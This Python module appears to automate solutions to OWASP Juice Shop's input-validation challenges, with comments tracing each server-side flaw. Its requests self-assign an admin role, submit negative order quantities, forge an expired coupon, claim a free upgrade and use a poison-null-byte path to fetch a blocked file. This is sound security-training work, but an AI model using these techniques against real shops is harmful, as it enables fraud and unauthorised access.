"""Improper Input Validation category solvers (11 of 12 — nftMintChallenge
needs a real funded Sepolia-testnet wallet + Alchemy API key, neither of which
this environment has, and is deferred). Verified against routes/verify.ts,
routes/order.ts, routes/deluxe.ts, routes/fileUpload.ts, routes/fileServer.ts,
lib/insecurity.ts, and models/feedback.ts (fetched 2026-08-09)."""
import base64
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts registerAdminChallenge/passwordRepeatChallenge/
# emptyUserRegistration: all three are Express middleware mounted on
# POST /api/Users, BEFORE finale-rest's actual user-creation handler. They
# fire purely on request-body content, regardless of whether the
# registration itself ultimately succeeds server-side. ---

@register("registerAdminChallenge", "Improper Input Validation", 3)
def solve_register_admin(ctx: SolverContext) -> None:
    email = f"regadmin.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.post(
        "/api/Users",
        json={"email": email, "password": "Test1234!", "passwordRepeat": "Test1234!", "role": "admin"},
    )


@register("passwordRepeatChallenge", "Improper Input Validation", 1)
def solve_password_repeat(ctx: SolverContext) -> None:
    email = f"pwrepeat.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.post(
        "/api/Users",
        json={"email": email, "password": "Test1234!", "passwordRepeat": "Different1234!"},
    )


@register("emptyUserRegistration", "Improper Input Validation", 2)
def solve_empty_user_registration(ctx: SolverContext) -> None:
    ctx.client.post("/api/Users", json={"email": "", "password": "", "passwordRepeat": ""})


# --- routes/order.ts calculateApplicableDiscount: config-driven campaign
# coupon codes (routes/order.ts's `campaigns` const) all have validOn dates
# in 2019-2023 — every one is already "expired" relative to real time, so
# submitting any of them via base64("<code>-<validOnEpochMs>") at checkout
# satisfies `campaign.validOn < Date.now()` without needing to touch the
# clock at all. WMNSDY2019's validOn is 1551999600000 (Mar 8 2019 00:00
# GMT+1, computed once via `node -e "console.log(new Date('Mar 08, 2019
# 00:00:00 GMT+0100').getTime())"`). ---

@register("manipulateClockChallenge", "Improper Input Validation", 4)
def solve_manipulate_clock(ctx: SolverContext) -> None:
    email = f"clock.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": 1}).raise_for_status()
    coupon_data = base64.b64encode(b"WMNSDY2019-1551999600000").decode()
    ctx.client.post(f"/rest/basket/{bid}/checkout", json={"couponData": coupon_data}).raise_for_status()


# --- routes/order.ts: `challengeUtils.solveIf(negativeOrderChallenge, () =>
# totalPrice < 0)`. Adding a basket item with a large negative quantity
# (quantityCheck's stock/limit comparisons are trivially satisfied for
# negative numbers, so nothing blocks it) makes that item's itemTotal
# negative, and checkout computes totalPrice as the sum of item totals. ---

@register("negativeOrderChallenge", "Improper Input Validation", 3)
def solve_negative_order(ctx: SolverContext) -> None:
    email = f"negorder.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": -1000}).raise_for_status()
    ctx.client.post(f"/rest/basket/{bid}/checkout").raise_for_status()


# --- routes/deluxe.ts upgradeToDeluxe: the free-upgrade branch is reached
# whenever `paymentMode` is anything other than the literal strings
# "wallet" or "card" — the two payment-verification blocks are skipped
# entirely, and the user is upgraded regardless. security.appendUserId()
# (mounted on this route) sets req.body.UserId from the auth token itself,
# so it doesn't need to be sent explicitly. ---

@register("freeDeluxeChallenge", "Improper Input Validation", 3)
def solve_free_deluxe(ctx: SolverContext) -> None:
    email = f"freedeluxe.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/rest/deluxe-membership", json={"paymentMode": "free"}).raise_for_status()


# --- routes/fileUpload.ts checkUploadSize/checkFileType: both are
# unconditional middleware on POST /file-upload (field name "file"),
# firing on every upload regardless of what later middleware does with the
# file. uploadSizeChallenge needs file.size > 100000 bytes (but under
# multer's own 200000-byte limit, or the upload itself gets rejected).
# uploadTypeChallenge needs an extension NOT in the server's allowed set
# (pdf/xml/zip/yml/yaml) — reusing the same oversized payload with a ".txt"
# name solves both challenges in one request. ---

@register("uploadSizeChallenge", "Improper Input Validation", 3)
def solve_upload_size(ctx: SolverContext) -> None:
    email = f"uploadsize.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    payload = b"A" * 150000
    ctx.client.post("/file-upload", files={"file": ("big.pdf", payload, "application/pdf")}).raise_for_status()


@register("uploadTypeChallenge", "Improper Input Validation", 3)
def solve_upload_type(ctx: SolverContext) -> None:
    email = f"uploadtype.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("payload.txt", b"not an allowed type", "text/plain")}).raise_for_status()


# --- models/feedback.ts rating setter: fires whenever a Feedback's rating
# is literally 0, bypassing the frontend's 1-5 star widget. Needs a fresh
# captcha, same as every /api/Feedbacks POST. ---

@register("zeroStarsChallenge", "Improper Input Validation", 1)
def solve_zero_stars(ctx: SolverContext) -> None:
    captcha = ctx.client.get("/rest/captcha").json()
    ctx.client.post(
        "/api/Feedbacks",
        json={"comment": "zero stars", "rating": 0, "captchaId": captcha["captchaId"], "captcha": captcha["answer"]},
    ).raise_for_status()


# --- routes/verify.ts accessControlChallenges: solved by requesting a
# specific, exact, already-percent-encoded product image filename whose
# raw bytes are not valid UTF-8/URL-safe when decoded — the check compares
# the *lowercased raw URL* against this literal encoded string, so no
# decoding on our end is needed, just requesting this exact path. ---

@register("missingEncodingChallenge", "Improper Input Validation", 1)
def solve_missing_encoding(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/products/%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg").raise_for_status()


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: solved
# either as a side effect of any of easterEggLevelOneChallenge/
# forgottenDevBackupChallenge/forgottenBackupChallenge/
# misplacedSignatureFileChallenge already being solved (all from Phase 2,
# or not run in this test's isolation), OR standalone by requesting the
# literal seeded file "encrypt.pyc" through the same poison-null-byte
# bypass — solved independently of any other challenge's state. ---

@register("nullByteChallenge", "Improper Input Validation", 4)
def solve_null_byte(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/encrypt.pyc%2500.md").raise_for_status()
